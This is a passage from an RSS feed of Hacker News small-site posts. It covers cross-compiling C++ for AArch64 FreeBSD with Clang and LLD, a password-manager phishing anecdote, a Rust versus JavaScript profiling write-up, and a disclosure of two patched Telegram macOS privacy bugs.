<p>Until a few years ago, the whole process wasn’t as smooth as it could be. Due to LLVM not having a full toolchain yet available, you were still supposed to provide a <code>binutils</code> build specific for your target. While this is generally much more tolerable than building the whole compiler (<code>binutils</code> is relatively fast to build), it was still somewhat of a nuisance, and I’m glad that <code>llvm-mc</code> (LLVM’s integrated assembler) and <code>lld</code> (universal linker) are finally stable and as flexible as the rest of LLVM.</p>

<p>With the toolchain now set, the next step becomes to obtain a sysroot in order to provide the needed headers and libraries to compile and link for your target.</p>

<h2 id="obtaining-a-sysroot">Obtaining a sysroot</h2>
<p>A super fast way to find a working system directory for a given OS is to rip it straight out of an existing system (a Docker container image will often also do).
For instance, this is how I used <code>tar</code> through <code>ssh</code> as a quick way to extract a working sysroot from a FreeBSD 13-CURRENT AArch64 VM <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>:</p>

<div><div><pre><code>$ mkdir ~/farm_tree
$ ssh FARM64 'tar cf - /lib /usr/include /usr/lib /usr/local/lib /usr/local/include' | bsdtar xvf - -C $HOME/farm_tree/
</code></pre></div></div>

<h2 id="invoking-the-cross-compiler">Invoking the cross compiler</h2>

<p>With everything set, it’s now only a matter of invoking Clang with the right arguments:</p>

<div><div><pre><code><span>$ </span> clang++ <span>--target</span><span>=</span>aarch64-pc-freebsd <span>--sysroot</span><span>=</span><span>$HOME</span>/farm_tree <span>-fuse-ld</span><span>=</span>lld <span>-stdlib</span><span>=</span>libc++ <span>-o</span> zpipe zpipe.cc <span>-lz</span> <span>--verbose</span>
clang version 11.0.1
Target: aarch64-pc-freebsd
Thread model: posix
InstalledDir: /usr/bin
 <span>"/usr/bin/clang-11"</span> <span>-cc1</span> <span>-triple</span> aarch64-pc-freebsd <span>-emit-obj</span> <span>-mrelax-all</span> <span>-disable-free</span> <span>-disable-llvm-verifier</span> <span>-discard-value-names</span> <span>-main-file-name</span> zpipe.cc <span>-mrelocation-model</span> static <span>-mframe-pointer</span><span>=</span>non-leaf <span>-fno-rounding-math</span> <span>-mconstructor-aliases</span> <span>-munwind-tables</span> <span>-fno-use-init-array</span> <span>-target-cpu</span> generic <span>-target-feature</span> +neon <span>-target-abi</span> aapcs <span>-fallow-half-arguments-and-returns</span> <span>-fno-split-dwarf-inlining</span> <span>-debugger-tuning</span><span>=</span>gdb <span>-v</span> <span>-resource-dir</span> /usr/lib/clang/11.0.1 <span>-isysroot</span> /home/marco/farm_tree <span>-internal-isystem</span> /home/marco/farm_tree/usr/include/c++/v1 <span>-fdeprecated-macro</span> <span>-fdebug-compilation-dir</span> /home/marco/dummies/cxx <span>-ferror-limit</span> 19 <span>-fno-signed-char</span> <span>-fgnuc-version</span><span>=</span>4.2.1 <span>-fcxx-exceptions</span> <span>-fexceptions</span> <span>-faddrsig</span> <span>-o</span> /tmp/zpipe-54f1b1.o <span>-x</span> c++ zpipe.cc
clang <span>-cc1</span> version 11.0.1 based upon LLVM 11.0.1 default target x86_64-pc-linux-gnu
<span>#include "..." search starts here:</span>
<span>#include &lt;...&gt; search starts here:</span>
 /home/marco/farm_tree/usr/include/c++/v1
 /usr/lib/clang/11.0.1/include
 /home/marco/farm_tree/usr/include
End of search list.
 <span>"/usr/bin/ld.lld"</span> <span>--sysroot</span><span>=</span>/home/marco/farm_tree <span>--eh-frame-hdr</span> <span>-dynamic-linker</span> /libexec/ld-elf.so.1 <span>--enable-new-dtags</span> <span>-o</span> zpipe /home/marco/farm_tree/usr/lib/crt1.o /home/marco/farm_tree/usr/lib/crti.o /home/marco/farm_tree/usr/lib/crtbegin.o <span>-L</span>/home/marco/farm_tree/usr/lib /tmp/zpipe-54f1b1.o <span>-lz</span> <span>-lc</span>++ <span>-lm</span> <span>-lgcc</span> <span>--as-needed</span> <span>-lgcc_s</span> <span>--no-as-needed</span> <span>-lc</span> <span>-lgcc</span> <span>--as-needed</span> <span>-lgcc_s</span> <span>--no-as-needed</span> /home/marco/farm_tree/usr/lib/crtend.o /home/marco/farm_tree/usr/lib/crtn.o
<span>$ </span>file zpipe
zpipe: ELF 64-bit LSB executable, ARM aarch64, version 1 <span>(</span>FreeBSD<span>)</span>, dynamically linked, interpreter /libexec/ld-elf.so.1, <span>for </span>FreeBSD 13.0 <span>(</span>1300136<span>)</span>, FreeBSD-style, with debug_info, not stripped
</code></pre></div></div>

<p>In the snipped above, I have managed to compile and link a C++ file into an executable for AArch64 FreeBSD, all while using just the <code>clang</code> and <code>lld</code> I had already installed on my GNU/Linux system.</p>

<p>More in detail:</p>
<ol>
  <li><code>--target</code> switches the LLVM default target (<code>x86_64-pc-linux-gnu</code>) to <code>aarch64-pc-freebsd</code>, thus enabling cross-compilation.</li>
  <li><code>--sysroot</code> forces Clang to assume the specified path as root when searching headers and libraries, instead of the usual paths. Note that sometimes this setting might not be enough, especially if the target uses GCC and Clang somehow fails to detect its install path. This can be easily fixed by specifying <code>--gcc-toolchain</code>, which clarifies where to search for GCC installations.</li>
  <li><code>-fuse-ld=lld</code> tells Clang to use <code>lld</code> instead whatever default the platform uses. As I will explain below, it’s highly unlikely that the system linker understands foreign targets, while LLD can natively support <em>almost</em> every binary format and OS <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</li>
  <li><code>-stdlib=libc++</code> is needed here due to Clang failing to detect that FreeBSD on AArch64 uses LLVM’s <code>libc++</code> instead of GCC’s <code>libstdc++</code>.</li>
  <li><code>-lz</code> is also specified to show how Clang can also resolve other libraries inside the sysroot without issues, in this case, <code>zlib</code>.</li>
</ol>

<p>The final test is now to copy the binary to our target system (i.e. the VM we ripped the sysroot from before) and check if it works as expected:</p>

<div><div><pre><code><span>$ </span>rsync zpipe FARM64:<span>"~"</span>
<span>$ </span>ssh FARM64
FreeBSD-ARM64-VM <span>$ </span><span>chmod</span> +x zpipe
FreeBSD-ARM64-VM <span>$ </span>ldd zpipe
zpipe:
        libz.so.6 <span>=&gt;</span> /lib/libz.so.6 <span>(</span>0x4029e000<span>)</span>
        libc++.so.1 <span>=&gt;</span> /usr/lib/libc++.so.1 <span>(</span>0x402e4000<span>)</span>
        libcxxrt.so.1 <span>=&gt;</span> /lib/libcxxrt.so.1 <span>(</span>0x403da000<span>)</span>
        libm.so.5 <span>=&gt;</span> /lib/libm.so.5 <span>(</span>0x40426000<span>)</span>
        libc.so.7 <span>=&gt;</span> /lib/libc.so.7 <span>(</span>0x40491000<span>)</span>
        libgcc_s.so.1 <span>=&gt;</span> /lib/libgcc_s.so.1 <span>(</span>0x408aa000<span>)</span>
FreeBSD-ARM64-VM <span>$ </span>./zpipe <span>-h</span>
zpipe usage: zpipe <span>[</span><span>-d</span><span>]</span> &lt; <span>source</span> <span>&gt;</span> dest
</code></pre></div></div>

<p>Success! It’s now possible to use this cross toolchain to build larger programs, and below I’ll give a quick example to how to use it to build real projects.</p>

<h3 id="optional-creating-an-llvm-toolchain-directory">Optional: creating an LLVM toolchain directory</h3>

<p>LLVM provides a mostly compatible counterpart for almost every tool shipped by <code>binutils</code> (with the notable exception of <code>as</code> <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>), prefixed with <code>llvm-</code>.</p>

<p>The most critical of these is LLD, which is a drop in replacement for a plaform’s system linker, capable to replace both GNU <code>ld.bfd</code> and <code>gold</code> on GNU/Linux or BSD, and Microsoft’s <code>LINK.EXE</code> when targeting MSVC. It supports linking on (almost) every platform supported by LLVM, thus removing the nuisance to have multiple specific linkers installed.</p>

<p>Both GCC and Clang support using <code>ld.lld</code> instead of the system linker (which may well be <code>lld</code>, like on FreeBSD) via the command line switch <code>-fuse-ld=lld</code>.</p>

<p>In my experience, I found that Clang’s driver might get confused when picking the right linker on some uncommon platforms, especially before version 11.0.
For some reason, <code>clang</code> sometimes decided to outright ignore the <code>-fuse-ld=lld</code> switch and picked the system linker (<code>ld.bfd</code> in my case), which does not support AArch64.</p>

<p>A fast solution to this is to create a toolchain directory containing symlinks that rename the LLVM utilities to the standard <code>binutils</code> programs:</p>

<div><div><pre><code><span>$ </span> <span>ls</span> <span>-la</span> ~/.llvm/bin/
Permissions Size User  Group Date Modified Name
lrwxrwxrwx    16 marco marco  3 Aug  2020  ar -&gt; /usr/bin/llvm-ar
lrwxrwxrwx    12 marco marco  6 Aug  2020  ld -&gt; /usr/bin/lld
lrwxrwxrwx    21 marco marco  3 Aug  2020  objcopy -&gt; /usr/bin/llvm-objcopy
lrwxrwxrwx    21 marco marco  3 Aug  2020  objdump -&gt; /usr/bin/llvm-objdump
lrwxrwxrwx    20 marco marco  3 Aug  2020  ranlib -&gt; /usr/bin/llvm-ranlib
lrwxrwxrwx    21 marco marco  3 Aug  2020  strings -&gt; /usr/bin/llvm-strings
</code></pre></div></div>

<p>The <code>-B</code> switch can then be used to force Clang (or GCC) to search the required tools in this directory, stopping the issue from ever occurring:</p>

<div><div><pre><code><span>$ </span> clang++ <span>-B</span><span>$HOME</span>/.llvm/bin <span>-stdlib</span><span>=</span>libc++ <span>--target</span><span>=</span>aarch64-pc-freebsd <span>--sysroot</span><span>=</span><span>$HOME</span>/farm_tree <span>-std</span><span>=</span>c++17 <span>-o</span> mvd-farm64 mvd.cc
<span>$ </span>file mvd-farm64
mvd-farm64: ELF 64-bit LSB executable, ARM aarch64, version 1 <span>(</span>FreeBSD<span>)</span>, dynamically linked, interpreter /libexec/ld-elf.so.1, <span>for </span>FreeBSD 13.0, FreeBSD-style, with debug_info, not stripped
</code></pre></div></div>

<h3 id="optional-creating-clang-wrappers-to-simplify-cross-compilation">Optional: creating Clang wrappers to simplify cross-compilation</h3>

<p>I happened to notice that certain build systems (and with <em>“certain”</em> I mean some poorly written <code>Makefile</code>s and sometimes Autotools) have a tendency to misbehave when <code>$CC</code>, <code>$CXX</code> or <code>$LD</code> contain spaces or multiple …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mcilloni.ovh/2021/02/09/cxx-cross-clang/">https://mcilloni.ovh/2021/02/09/cxx-cross-clang/</a></em></p>]]>
            </description>
            <link>https://mcilloni.ovh/2021/02/09/cxx-cross-clang/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111761</guid>
            <pubDate>Fri, 12 Feb 2021 08:42:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I'm Glad for Using 1Password]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26111393">thread link</a>) | @bengtan
<br/>
February 11, 2021 | https://marcel.is/1password/ | <a href="https://web.archive.org/web/*/https://marcel.is/1password/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the past month, two things happened to me that made me realize how glad I'm for using a password manager, namely <a href="https://1password.com/">1Password</a>.</p>
<p>First thing is about a login page. I was searching for a Github repo on DuckDuckGo, and I clicked on a link in the search results. As I was about to fill in the password with a 1Password shortcut, I noticed that 1Password wasn't filling in the login details. How strange, I thought. Puzzled, I looked at the url. And then I saw it—I almost fell for a phishing attack! The url was <a href="https://marcel.is/1password/github.com.cnpmjs.org">github.com.cnpmjs.org</a> instead of <a href="https://github.com/">github.com</a>. I knew of phishing attacks, and thought I'd never fell for such a simple trick. Yet, I almost did.</p>
<p>Second thing is about email. As I'm migrating away from gmail, I thought I would check out the spam folder. I usually don't do that, but I thought I'd peek in. One email caught my eye: the email subject was my password. The site must have been compromised and the attacker got hold of my email and password. Fortunately, the damage radius was minimal, as I have generated unique passwords for each site.</p>
<p><img src="https://marcel.is/img/1password-email.png" alt="1password-email"></p></div></div>]]>
            </description>
            <link>https://marcel.is/1password/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111393</guid>
            <pubDate>Fri, 12 Feb 2021 07:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Showdown: Rust vs Javascript (2020)]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 102 (<a href="https://news.ycombinator.com/item?id=26111387">thread link</a>) | @KingOfCoders
<br/>
February 11, 2021 | https://cesarvr.io/post/rust-performance/ | <a href="https://web.archive.org/web/*/https://cesarvr.io/post/rust-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After spending some weeks playing with Rust, I felt ready to test my skills and try some programming challenges in the <a href="https://adventofcode.com/">Advent Of Code</a>. My approach to tackle some of those challenges was to solve them using Javascript (I use it in my day to day) first and then port the code to Rust. While writing the port I just focus on getting the Rust code as elegant as possible to achieve that I research the Rust API's to get syntactically correct. It was after finishing porting this <a href="https://adventofcode.com/2018/day/5">puzzle</a> in particular and feeling a sense of accomplishment that I decided to test how the Rust compiled code will perform against Javascript interpreter.</p><h2 id="naive-algorithm">Naive Algorithm</h2><hr><p>Before jumping to the whom-was-slower-and-why, let’s take a quick look at <a href="https://adventofcode.com/2018/day/5">puzzle</a> (so you see there is no hidden agenda) which goes like this:</p><p>You are given an input string with <code>N</code> amount of characters and we should write an algorithm that find and remove any sequential pairs of characters that similar but have different capitalisation, examples of this are:</p><div><pre><code data-lang="sh">bB <span># Remove</span>
bb <span># Do Nothing</span>
ab <span># Do Nothing</span>
</code></pre></div><p>The algorithm should re-evaluate the string recursively searching for new pairs created after the removal, something like tetris.</p><p>We have this input:</p><p>We should remove <code>bB</code> to get:</p><p>Then because <code>aA</code> has been formed we should eliminated this too:</p><p>Then we remove <code>dD</code> and the final string should be:</p><h3 id="my-solution">My Solution</h3><p>To solve this I wrote two functions, one that <code>process</code> takes array of characters, traverse the array a pair at a time and validate that they follow the rules mentioned above:</p><h4 id="rust">Rust</h4><hr><div><pre><code data-lang="rust"><span>fn</span> <span>process</span>(tokens: <span>&amp;</span><span>mut</span> Vec<span>&lt;</span>String<span>&gt;</span>) -&gt; <span>i32</span> {
  <span>let</span> <span>mut</span> polymer: Vec<span>&lt;</span>String<span>&gt;</span> <span>=</span> Vec::new();

  <span>while</span> <span>let</span> Some(token) <span>=</span> tokens.pop() {
      <span>if</span> polymer.is_empty() {
          polymer.push(token);
          <span>continue</span>;
      }

      <span>let</span> candidate <span>=</span> polymer.pop().unwrap();

      <span>if</span> <span>!</span>react(<span>&amp;</span>candidate, <span>&amp;</span>token) {
          polymer.push(candidate.to_string());
          polymer.push(token.to_string());
      }
  }

  polymer.len() <span>as</span> <span>i32</span>
}
</code></pre></div><h4 id="javascript">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>process</span>(<span>data</span>) {
  <span>let</span> <span>queue</span> <span>=</span> []  <span>// Save here tested characters.
</span><span></span>
  <span>while</span>(<span>data</span>.<span>length</span> <span>&gt;</span> <span>0</span>) {
    <span>let</span> <span>candidate_1</span> <span>=</span> <span>data</span>.<span>pop</span>()
    <span>let</span> <span>candidate_2</span> <span>=</span> <span>queue</span>.<span>pop</span>() <span>// get the last character that passed the test.
</span><span></span>
    <span>if</span> (<span>candidate_2</span> <span>===</span> <span>undefined</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
      <span>continue</span>
    }

    <span>let</span> <span>react</span> <span>=</span> <span>reacting</span>(<span>candidate_1</span>, <span>candidate_2</span>)

    <span>if</span>(<span>!</span><span>react</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_2</span>)
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
    }
  }

  <span>return</span> <span>result</span>.<span>length</span>
}

</code></pre></div><blockquote><p><em>Notice</em> the <em>performance</em> optimization by keeping the last character in a different queue, that way we don’t need to traverse the whole array looking for matches after a previous removal.</p></blockquote><p>Then each pair of characters is evaluated using a function called <code>react</code> that returns <code>true</code> or <code>false</code> if the pair need to be removed:</p><h4 id="rust-1">Rust</h4><hr><div><pre><code data-lang="rust">
  <span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {
        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
  }
</code></pre></div><h4 id="javascript-1">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>react</span>(<span>candidate_1</span>, <span>candidate_2</span>) {
  <span>if</span> (<span>candidate_1</span>.<span>toLowerCase</span>() <span>===</span> <span>candidate_2</span>.<span>toLowerCase</span>()) {
    <span>if</span> ( <span>candidate_1</span> <span>!==</span> <span>candidate_2</span> ) {
      <span>return</span> <span>true</span>
    }
  }

  <span>return</span> <span>false</span>
}
</code></pre></div><blockquote><p>Basically is a rudimentary implementation of an <strong>equals-ignore-case</strong> plus an additional check to see if they are they same character (the same capitalization).</p></blockquote><p>To complete the challenge each version (Rust, Javascript) needs to reduce a large string (<a href="https://adventofcode.com/2018/day/5/input">50K character</a>) which is good enough to test how well one version performs against the other, then I run each code using Linux <code>time</code> and got this:</p><div><pre><code data-lang="python"><span># Javascript (Node.js)</span>
  real  <span>0</span>m0<span>.</span><span>374</span>s
  user  <span>0</span>m0<span>.</span><span>301</span>s
  sys   <span>0</span>m0<span>.</span><span>030</span>s

<span># Rust</span>
  real  <span>0</span>m0<span>.</span><span>720</span>s
  user  <span>0</span>m0<span>.</span><span>636</span>s
  sys   <span>0</span>m0<span>.</span><span>012</span>s
</code></pre></div><p>This is a surprising turn of events, here we can see the Rust version is <code>2x</code> slower than Javascript, How? My first reaction (in an act of self denial) was to check the compiler flags <code>opt-level</code> and after checking that was fine, which to be honest won’t make a difference, I started to look for inefficiencies in the code, first using the ancient <a href="http://www.brendangregg.com/methodology.html">Drunk man anti-method</a> technique and when that didn’t work, I end up settling for a more scientific method of profiling my code with <a href="https://perf.wiki.kernel.org/index.php/Main_Page">perf</a>.</p><h2 id="debugging">Debugging</h2><hr><p>Every time you are debugging a performance issues you might feel tempted to start adding your own function to calculate the duration of suspicious section of code (like I used to do, in the past). <a href="http://www.brendangregg.com/perf.html">Perf</a> does this for you by taking various approaches such as listening to CPU/Kernel <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/developer_guide/perf">performance events</a> metrics emitted by the system in reaction of your process while running. Things like this makes perf the tool of choice to debug performance issues, so let’s see how it works.</p><h3 id="debugging-symbols">Debugging Symbols</h3><p>Before we start we need to enable the <a href="http://carol-nichols.com/2015/12/09/rust-profiling-on-osx-cpu-time/">debugging symbols</a> on the Rust compiler, this will make <code>perf</code> reports more informative. To enable this add <code>debug=true</code> to the <code>Cargo.toml</code>:</p><div><pre><code data-lang="toml">[<span>profile</span>.<span>release</span>]
<span>opt</span><span>-</span><span>level</span> = <span>3</span>
<span>debug</span>=<span>true</span>
</code></pre></div><h3 id="attaching-perf">Attaching Perf</h3><p>I recompiled the code and attached <code>perf</code>:</p><div><pre><code data-lang="zsh">cargo build
./target/release/day-5 &amp; perf record -F <span>99</span> -p <span>`</span>pgrep day-5<span>`</span>
</code></pre></div><ul><li>First we run the Rust program (<code>day-5</code>) and we send it to the background using the ampersand (<code>&amp;</code>) symbol.</li><li>Next to it, so it executes immediately, we run <code>perf</code> that receives the process identifier (<a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a>) courtesy of <code>pgrep day-5</code>.</li><li>The <a href="https://linux.die.net/man/1/pgrep">pgrep</a> command returns the <a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a> of a process by name.</li></ul><p>Here is the output:</p><div><pre><code data-lang="bash"><span>[</span>1<span>]</span> <span>27466</span>
sample size <span>50003</span>
--
solution 1: <span>9526</span>
solution 2: <span>6694</span>


<span>[</span> perf record: Woken up <span>1</span> times to write data <span>]</span>
<span>[</span>1<span>]</span>  + <span>27466</span> <span>done</span>       ./target/release/day-5
<span>[</span> perf record: Captured and wrote 0.002 MB perf.data <span>(</span><span>13</span> samples<span>)</span> <span>]</span>
</code></pre></div><h3 id="report">Report</h3><p>After running this multiple times,<code>perf</code> automatically aggregates the data to a report file (<code>perf.data</code>) in the same folder where we are making the call.</p><p>Now we can visualise the report with:</p><p><img src="https://raw.githubusercontent.com/cesarvr/hugo-blog/master/static/rust/perf-1.png" alt=""></p><p>Interestingly the algorithm spend <strong>30 percent</strong> of the time in the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">String::to_lowercase</a> which is suspicious:</p><div><pre><code data-lang="rust"><span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {  <span>// 30% CPU wasted here
</span><span></span>        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
}
</code></pre></div><p>My first impression is that I made a mistake while running <code>perf</code> (never used it before with Rust), but everything started to make sense once I looked at the source code of the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">to_lowercase</a> function.</p><p>What happen is that Rust lowercase function try to be correct in any language, so it delegates this conversion to a function called <a href="https://doc.rust-lang.org/1.29.2/std_unicode/conversions/fn.to_lower.html">std_unicode::conversions</a> this function then does a <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary search</a> of each character against a big array (≈1200) of unicode characters:</p><div><pre><code data-lang="rust">
<span>const</span> to_lowercase_table: <span>&amp;</span>[(char, [char; <span>3</span>])] <span>=</span> <span>&amp;</span>[
        (<span>'\u{41}'</span>, [<span>'\u{61}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{42}'</span>, [<span>'\u{62}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{43}'</span>,<span>//...≈1200 ]
</span><span></span>

 <span>pub</span> <span>fn</span> <span>to_lower</span>(c: <span>char</span>) -&gt; [char; <span>3</span>] {
        <span>match</span> bsearch_case_table(c, to_lowercase_table) {
            None        <span>=</span><span>&gt;</span> [c, <span>'\0'</span>, <span>'\0'</span>],
            Some(index) <span>=</span><span>&gt;</span> to_lowercase_table[index].<span>1</span>,
        }
    }

</code></pre></div><blockquote><p>Going back at the code, this binary search is done twice per iteration now multiply this by <code>50K</code> and we found the reason for the slow down.</p></blockquote><p>After some googling I found that I should use <a href="https://doc.rust-lang.org/src/core/str/mod.rs.html#4006">eq_ignore_ascii_case</a> instead, which basically makes this operation in <a href="https://doc.rust-lang.org/1.37.0/src/core/slice/mod.rs.html#2487">linear time</a> and for one character is nearly the same as saying constant time. I recompiled the code and run the benchmarks:</p><div><pre><code data-lang="xml">Node.JS
real  0m0.374s
user  0m0.301s
sys   0m0.030s

Rust
real  0m0.283s
user  0m0.248s
sys   0m0.005s
</code></pre></div><p>Now we are talking, profiling has pay its dividends and made the Rust program <code>2.5x</code> <em>faster</em> than the original and <code>91ms</code> faster than the Javascript version, I can start celebrating and telling my friends that I’m a Rust expert now. But this leaves me with some questions:</p><blockquote><p>The <code>91ms</code> is not bad, but I wonder how much effort it will take to optimize this code to make it <code>&gt;1.5x</code> faster than the Javascript counterpart?</p></blockquote><h2 id="performance-on-macos">Performance On MacOS</h2><p>While I was thinking of this and was in the middle of unpacking my Rust stickers and preparing my laptop for some re-branding, I decided to move the code (Javascript and Rust) from my Linux VM to my main OS (<strong>MacOS Catalina</strong>), once there I gave the benchmark another try because I <em>love</em> suffering:</p><div><pre><code data-lang="sh">Node   0.17s user 0.03s system 101% cpu 0.209 total
Rust   0.23s user 0.01s system 98% cpu 0.238 total
</code></pre></div><p>After seeing this my confidence in my time measuring tool (<code>time</code>) started to fade a bit, but once I calm down and use the <a href="https://developer.apple.com/library/archive/documentation/AnalysisTools/Conceptual/instruments_help-collection/Chapter/Chapter.html">XCode Instrumentation</a> which point me in the right direction:</p><p><img src="https://github.com/cesarvr/hugo-blog/blob/master/static/rust/malloc-xcode-2.png?raw=true" alt=""></p><blockquote><p>The slowest part of the program (Rust version) is the part that does the allocation and deallocation of memory produced when calling MacOS <code>malloc</code>.</p></blockquote><p>To catch this one I'll need to dig more into Rust inner workings. Does this make it more expensive to get performance out of Rust? Did I choose the wrong abstractions? That's for another post. If you want to take a look at the code yourself here is the <a href="https://github.com/cesarvr/AOCRust/tree/master/day-5">Rust</a> and <a href="https://github.com/cesarvr/AOCRust/tree/master/JS">JS</a>, if you have any improvement, idea, suggestions or performance trick let me know by <a href="https://twitter.com/cvaldezr">Twitter</a>, <a href="https://github.com/cesarvr/AOCRust">pull request</a> or <a href="https://github.com/cesarvr/hugo-blog/issues">open an issue</a>.</p></div></div>]]>
            </description>
            <link>https://cesarvr.io/post/rust-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111387</guid>
            <pubDate>Fri, 12 Feb 2021 07:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “P” in Telegram stands for Privacy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26111309">thread link</a>) | @giuliomagnifico
<br/>
February 11, 2021 | https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html | <a href="https://web.archive.org/web/*/https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-5173062149660468180">
<p><b>Summary: </b>While understanding the implementation of various security and privacy measures in telegram, I identified that telegram fails again in terms of handling the users data. My initial study started with understanding how self-destructing messages work in the secret chats option, telegram says that "<i>The clock starts ticking the moment the message is displayed on the recipient's screen (gets two check marks). As soon as the time runs out, the message disappears from both devices.</i>"&nbsp; <br></p><div><p>Telegram which has <span>500 million active users suffers from</span> a logical bug exists in telegram for macOS (7.3 (211334) Stable) which stores the local copy of received message (audio/video) on a custom path even after those messages are deleted/disappeared from the secret chat.</p></div>
<div>
  <p><b>Technical analysis:</b> Open telegram for macOS, send a recorded audio/video message in normal chat, the application leaks the sandbox path where the recorded message is stored in ".mp4" file.</p></div>
<p><a href="https://1.bp.blogspot.com/-OWIztNLn6eA/X-mWOOVyHSI/AAAAAAAAD2c/sYkz0hSjzX41bCvNuS9fTy6QW14G6v6TgCPcBGAYYCw/s2560/Telegram_Info_Leak.gif"><img data-original-height="880" data-original-width="2560" src="https://1.bp.blogspot.com/-OWIztNLn6eA/X-mWOOVyHSI/AAAAAAAAD2c/sYkz0hSjzX41bCvNuS9fTy6QW14G6v6TgCPcBGAYYCw/s16000/Telegram_Info_Leak.gif"></a></p><p>
  In my case the path was (<span><span>/var/folders/x7/khjtxvbn0lzgjyy9xzc18z100000gn/T/</span></span>). While performing the same task under secret chat option the
  <span>MediaResourceData(path://)</span> URI was not
  leaked but the recorded audio/video message still gets stored on the above
  path.<br>
</p>

<div>
  <iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="549" src="https://www.youtube.com/embed/Go-4srm_1fQ" width="875"></iframe><p>&nbsp;In the video proof-of-concept the user receives a self-destructed message in the secret chat option, which gets stored even after the message is self-destructed.</p></div><p><b>Bonus: </b>The above mentioned version of telegram for macOS stores local passcode in plain text, below is the video proof-of-concept.</p><iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="549" src="https://www.youtube.com/embed/zEt-_5b4OaA" width="875"></iframe><div><p>Both the vulnerabilities was patched in version <a href="https://macos.telegram.org/#v7-4-2021-01-29" target="_blank">7.4 (212543) Stable</a> and 3000 EURO bounty was awarded. In past I've identified multiple vulnerabilities under Telegram you can read them <a href="https://www.inputzero.io/" target="_blank">here</a>. Later today Fri 12 Feb 12:15 PM, CVE-2021-27204 &amp; CVE-2021-27205 was assigned. What next?</p><blockquote><p dir="ltr" lang="en">Use Signal</p>— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1347165127036977153?ref_src=twsrc%5Etfw">January 7, 2021</a></blockquote> </div>
<p>
Share: <a href="https://www.facebook.com/share.php?v=4&amp;src=bm&amp;u=https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html&amp;t=The%20%22P%22%20in%20Telegram%20stands%20for%20Privacy" onclick="window.open(this.href,&quot;sharer&quot;,&quot;toolbar=0,status=0,width=626,height=436&quot;); return false;" rel="nofollow" target="_blank" title="Share this on Facebook"><i></i></a><a href="https://twitter.com/home?status=The%20%22P%22%20in%20Telegram%20stands%20for%20Privacy%20--%20https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html" rel="nofollow" target="_blank" title="Tweet This!"><i></i></a><a href="https://plus.google.com/share?url=https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html" onclick="javascript:window.open(this.href,   &quot;&quot;, &quot;menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600&quot;);return false;" rel="nofollow" target="_blank" title="Share this on Google+"><i></i></a><a href="https://pinterest.com/pin/create/button/?source_url=https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html&amp;media=https://1.bp.blogspot.com/-OWIztNLn6eA/X-mWOOVyHSI/AAAAAAAAD2c/sYkz0hSjzX41bCvNuS9fTy6QW14G6v6TgCPcBGAYYCw/s16000/Telegram_Info_Leak.gif&amp;description=The%20%22P%22%20in%20Telegram%20stands%20for%20Privacy" rel="nofollow" target="_blank" title="Share on Pinterest"><i></i></a>
</p>

</div></div>]]>
            </description>
            <link>https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111309</guid>
            <pubDate>Fri, 12 Feb 2021 06:55:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Redux Dead?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26111098">thread link</a>) | @deleteman
<br/>
February 11, 2021 | https://blog.asayer.io/is-redux-dead | <a href="https://web.archive.org/web/*/https://blog.asayer.io/is-redux-dead">archive.org</a>
